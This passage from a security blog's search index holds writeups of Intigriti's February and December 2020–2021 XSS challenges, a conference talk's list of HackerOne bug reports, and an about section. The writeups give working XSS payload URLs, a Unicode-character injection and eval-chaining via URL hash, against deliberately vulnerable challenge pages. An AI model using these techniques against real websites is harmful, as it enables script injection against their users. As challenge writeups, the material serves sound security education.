\u003celem id=\"result\"\u003e \u003celem id=\"result\" name=\"questionAnswer\" value=\"alert(origin)//\"\u003e Looking through MDN documentation, the only usable element that has value attribute is \u003cdata\u003e as only its first two letters (da) can be embedded as a hexadecimal value to start a tag normally instead of a gibberish. Finally we can construct our payload ?assignmentTitle=∀㸀㳚ta%20id=result㸀㳚ta%20id=result%20name=questionAnswer%20value=alert(origin)//\u0026autosubmit ∀ (U+2200) to render a doublequote (\"), 㸀 (U+3E00) to render a greater than sign (\u003e), 㳚 (U+3CDA) to render a less than sign (\u003c) and reflect DA characters to start the \u003cdata\u003e tag, and autosubmit query parameter to execute startGrade function without user interaction (line 71). Which should result in something like this being injected into the page \"00\u003e00\u003cdata id=result\u003e00\u003cdata id=result name=questionAnswer value=alert(origin)// Pop the alertPop the alert \" Pop the alert The final URL - https://challenge-0221.intigriti.io/?assignmentTitle=∀㸀㳚ta%20id=result㸀㳚ta%20id=result%20name=questionAnswer%20value=alert(origin)//\u0026autosubmit ","date":"22-02-2021","objectID":"/2021/02/intigriti-february-xss-challenge/:0:2","tags":["challenge","xss","intigriti","unicode","eval","DOM clobbering"],"title":"Intigriti's February XSS Challenge Writeup","uri":"/2021/02/intigriti-february-xss-challenge/"},{"categories":["Conferences"],"content":"At this year’s Armsec seventh annual information security conference - reARMSEC, I made a small presentation (Google slides, PDF version) on why the modern web is hard describing HackerOne’s top 10 most impactful and rewarded vulnerability types for 2020. As for the real-life examples of the bugs, I gathered reports mostly from HackerOne’s Hacktivity. XSS (Cache Poisoning): HackerOne report #394016, XSS on Discourse by Sergey Bobrov HackerOne report #415168, XSS on QIWI by Sergey Bobrov XSS (DOM): XSS on Google Search (closure), mXSS by Masato Kinugawa serialization bug in \u003cnoscript\u003e by Michał Bentkowski HackerOne report #876148, DOM XSS on DuckDuckGo by Predrag Cujanović uXSS: Semi Universal XSS affecting Firefox for iOS, CVE-2019-17004 by Cliqz uXSS in Chrome on iOS, CVE-2018-6128 by Tomasz Bojarski Electron: Microsoft Teams zero click xss by Oskars Vegeris Discord RCE by Masato Kinugawa (not in slides, but definitely a must read) AAA vulnerabilities: Exploiting e-mail systems by Inti De Ceukelaire HackerOne report #493324, privilege escalation to gitlab admin by Anton Subbotin Facebook Access Token Security Breach (30 million accounts) by 👻 HackerOne report #605720, vertical privilege escalation on HackerOne by Vladimir Metnew HackerOne report #663431, IDOR on HackerOne by Jobert Abma Facebook account takeover via recovery code bruteforce by Anand Prakash Information Disclosure: HackerOne report #396467, Snapchat’s github token leaked publicly by Majd HackerOne report #885539, Twitter private list members disclosure via GraphQL by RyotaK HackerOne report #489146, confidential data of users and limited metadata of programs and reports accessible via GraphQL on HackerOne by Yash Sodha (not in slides, but definitely a must read) SSRF: HackerOne report #347139, LFI and SSRF via XXE on Rockstar Games by Alex Birsan HackerOne report #923132, redirect SSRF on Dropbox by Sayaan Alam HackerOne report #541169, SSRF via DNS rebinding on Gitlab by Alex Chapman HackerOne report #530974, Server-Side Request Forgery using Javascript on Snapchat by Ben Sadeghipour CSRF: HackerOne report #1010522, TikTok Careers Portal Account Takeover via CSRF by Lauritz SSTI: HackerOne report #125980, RCE via Flask Jinja2 Template Injection on Uber by Orange Tsai Insecure Deserialization: RCE on Facebook by Orange Tsai SQL injection: HackerOne report #137956, Error based SQL injection on Mail.ru by Vahagn Israelian HackerOne report #10037, Boolean based SQL injection on Mail.ru by Vahagn Vardanian HackerOne report #786044, Time based SQL injection on Mail.ru by Austin Augie HackerOne report #852306, SQLI Wildcard Injection on Mail.ru by Alexey (bazzy) To learn more (I’ll try to update this list constantly): Books - Web Application Hacker’s Handbook, Web Hacking 101, The Tangled Web, The Art of Software Security Assessment Writeups - HackerOne’s Hacktivity, bugcrowd’s CrowdStream, CTFtime.org writeups Labs - PortSwigger Web Security Academy, TryHackMe, hackxor, OverTheWire: Wargames Follow these people/pages - https://twitter.com/davwwwx/following ","date":"27-12-2020","objectID":"/2020/12/armsec-2020/:0:0","tags":["web security","bug bounties","hackerone","owasp","top 10","conferences"],"title":"Web is hard, reARMSEC aka ARMSec 2020","uri":"/2020/12/armsec-2020/"},{"categories":["Challenges"],"content":"This month’s Intigriti’s XSS challenge was interesting as a couple of hours after Frans Rosén submitted an unintended solution, and I got interested in that one more than in the original. Unintended SolutionUnintended Solution by Frans Rosen \" Unintended Solution Challenge on webarchive https://web.archive.org/web/20201208103813/https://challenge-1220.intigriti.io/. Vulnerable script on webarchive https://web.archive.org/web/20201210000939/https://challenge-1220.intigriti.io/script.js. ","date":"14-12-2020","objectID":"/2020/12/intigriti-december-xss-challenge/:0:0","tags":["challenge","xss","intigriti","eval","unintended"],"title":"Intigriti's December XSS Challenge Writeup","uri":"/2020/12/intigriti-december-xss-challenge/"},{"categories":["Challenges"],"content":"Solution 1 Parsing query parameters using custom function (e.g. getQueryVariable, line 3) allows to specify those in URL hash on line 11 (below) window.location.href.substr(...), as String.prototype.indexOf() is looking for the first occurance of ? (question mark): function init(){ try{ document.getElementById(\"result\").value = calc(getQueryVariable(\"num1\"), getQueryVariable(\"num2\"), getQueryVariable(\"operator\")); } catch(ex){ console.log(ex); } } ... function getQueryVariable(variable) { window.searchQueryString = window.location.href.substr(window.location.href.indexOf(\"?\") + 1, window.location.href.length); var vars = searchQueryString.split('\u0026'); var value; for (var i = 0; i \u003c vars.length; i++) { var pair = vars[i].split('='); if (decodeURIComponent(pair[0]) == variable) { value = decodeURIComponent(pair[1]); } } return value; } Two of the sources (num1 and num2) are passed to setNumber function (line 23) when clicking on a number, which itself then passes it to parseInt (lines 101, 104), also there is no protection against iframing it, so, having such URL https://challenge-1220.intigriti.io/#?num1=parseInt\u0026operator=%3d\u0026num2=eval in an iframe, we can execute parseInt=eval as operation in the context of the vulnerable webpage, because = is whitelisted as an operator: const operators = [\"+\", \"-\", \"/\", \"*\", \"=\"]; function calc(num1 = \"\", num2 = \"\", operator = \"\"){ operator = decodeURIComponent(operator); var operation = `${num1}${operator}${num2}`; document.getElementById(\"operation\").value = operation; if(operators.indexOf(operator) == -1){ throw \"Invalid operator.\"; } if(!(/^[0-9a-zA-Z-]+$/.test(num1)) || !(/^[0-9a-zA-Z]+$/.test(num2))){ throw \"No special characters.\" } if(operation.length \u003e 20){ throw \"Operation too long.\"; } return eval(operation); } ... window.onload = function(){ init(); var numberBtns = document.body.getElementsByClassName(\"number\"); for(var i = 0; i \u003c numberBtns.length; i++){ numberBtns[i].onclick = function(e){ setNumber(e.target.innerText) }; }; var operatorBtns = document.body.getElementsByClassName(\"operator\"); for(var i = 0; i \u003c operatorBtns.length; i++){ operatorBtns[i].onclick = function(e){ setOperator(e.target.innerText) }; }; var clearBtn = document.body.getElementsByClassName(\"clear\")[0]; clearBtn.onclick = function(){ clear(); } } ... function setNumber(number){ var url = new URL(window.location); var num1 = getQueryVariable('num1') || 0; var num2 = getQueryVariable('num2') || 0; var operator = getQueryVariable('operator'); if(operator == undefined || operator == \"\"){ url.searchParams.set('num1', parseInt(num1 + number)); } else if(operator != undefined){ url.searchParams.set('num2', parseInt(num2 + number)); } window.history.pushState({}, '', url); init(); } Now we can redirect the iframe to a new hash https://challenge-1220.intigriti.io/#?num1=parseInt\u0026operator=%3d\u0026num2=alert(document.domain)// and as, only, the URL hash is changed, no request is going to be sent to the server and if the user hits any number, the following script will be executed alert(document.domain)//\u003cnumber\u003e. A similar technique can be leveraged when having calc=eval executed then redirecting to a new hash https://challenge-1220.intigriti.io/#?num1=alert(document.domain)\u0026operator=%3d\u0026num2=eval, where the user has to hit an operator POCs: for numbers - https://jsfiddle.net/td6yzm0w/1/ for operators - https://jsfiddle.net/td6yzm0w/ Intigriti tip tweetIntigriti tip tweet \" Intigriti tip tweet ","date":"14-12-2020","objectID":"/2020/12/intigriti-december-xss-challenge/:0:1","tags":["challenge","xss","intigriti","eval","unintended"],"title":"Intigriti's December XSS Challenge Writeup","uri":"/2020/12/intigriti-december-xss-challenge/"},{"categories":["Challenges"],"content":"Solution 2 Now the intended one, that leads to DOM XSS (Cross site swagging) with no user interaction. Intigriti tip tweetIntigriti tip tweet \" Intigriti tip tweet Very right, because getQueryVariable iterates in a loop and takes the value of the last occurrence of the requested parameter (lines 5-10) function getQueryVariable(variable) { window.searchQueryString = window.location.href.substr(window.location.href.indexOf(\"?\") + 1, window.location.href.length); var vars = searchQueryString.split('\u0026'); var value; for (var i = 0; i \u003c vars.length; i++) { var pair = vars[i].split('='); if (decodeURIComponent(pair[0]) == variable) { value = decodeURIComponent(pair[1]); } } return value; } Chain: https://challenge-1220.intigriti.io/?num1=onhashchange\u0026operator=%3d\u0026num2=init\u0026#d\u0026 - execute onhashchange=init https://challenge-1220.intigriti.io/?num1=onhashchange\u0026operator=%3d\u0026num2=init\u0026#d\u0026num1=calc\u0026num2=eval - changing hash, triggering onhashchange which is init now and executing calc=eval https://challenge-1220.intigriti.io/?num1=onhashchange\u0026operator=%3d\u0026num2=init\u0026#d\u0026num1=calc\u0026num2=eval\u0026num1=alert(‘achievement%20unlocked:%20unlimited%20swag%20vouchers%20’%2bdocument.domain) - triggering onhashchange and passing alert('achievement unlocked: unlimited swag vouchers '+document.domain) to eval Now you can claim your unlimited swag voucher with 0 click: Pop an alertPop an alert \" Pop an alert POC: https://jsfiddle.net/vsz08bpo/ ","date":"14-12-2020","objectID":"/2020/12/intigriti-december-xss-challenge/:0:2","tags":["challenge","xss","intigriti","eval","unintended"],"title":"Intigriti's December XSS Challenge Writeup","uri":"/2020/12/intigriti-december-xss-challenge/"},{"categories":["Misc"],"content":"Hi, I am a web application developer and cybersecurity enthusiast from Armenia. On this blog, I am going to post mainly Bug bounty and CTF writeups, reconnaissance techniques, approaches to pentesting and my thoughts on general infosec. Stay tuned for more. ","date":"15-09-2020","objectID":"/2020/09/what-is-this-blog-about/:0:0","tags":["about","blog"],"title":"What is this blog about","uri":"/2020/09/what-is-this-blog-about/"},{"categories":null,"content":"poke  Telegram @davwwwx  Twitter @davwwwx  Github @davwwwx ","date":"15-09-2020","objectID":"/about/:0:0","tags":null,"title":"about:blank","uri":"/about/"}]